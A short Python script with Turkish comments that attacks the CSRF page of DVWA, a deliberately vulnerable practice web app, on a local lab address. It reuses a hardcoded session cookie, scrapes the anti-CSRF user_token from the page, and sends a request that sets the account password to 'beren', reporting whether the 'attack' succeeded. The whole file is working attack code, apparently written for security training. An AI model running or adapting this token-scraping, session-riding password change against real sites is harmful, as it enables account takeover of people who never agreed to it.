"""
author: Beren Kuday GÖRÜN
"""

import requests
from bs4 import BeautifulSoup
#pip3 install bs4


cookies = {
	'security': 'high',
	'PHPSESSID':'796fe5af9504cd94490124de99c046aa'
}

url = 'http://192.168.182.131/dvwa2/vulnerabilities/csrf/'

istek = requests.get(url, cookies=cookies)

kaynak_koduParser = BeautifulSoup(istek.content,"lxml")

tokenDurumu = 0
token = ""
try:#token varsa
	token  = kaynak_koduParser.find('input', {'name': 'user_token'}).get('value')
	print("[*] CSRF için token tespit edildi:", token)
	tokenDurumu = 1
except:
	print("[*] Token tespit edilemedi. Saldırıya devam ediliyor...")
"""
Örnek bir GET isteği
GET /dvwa2/vulnerabilities/brute/index.php?username=admin&password=asd&Login=Login&user_token=6905d0035db25262f4b01ea001cba3d6
"""

sifre = "beren"

url = "http://192.168.182.131/dvwa2/vulnerabilities/csrf/?password_new="+ sifre + "&password_conf=" + sifre + "&Change=Change"
if(tokenDurumu):
	url = url + "&user_token=" + token
istek = requests.get(url, cookies=cookies)

if(str(istek.content).find("Password Changed.") != -1):
	print("[*] Şifre değiştirildi yeni şifre:", sifre)
else:
	print("[*] Başarısız işlem!")

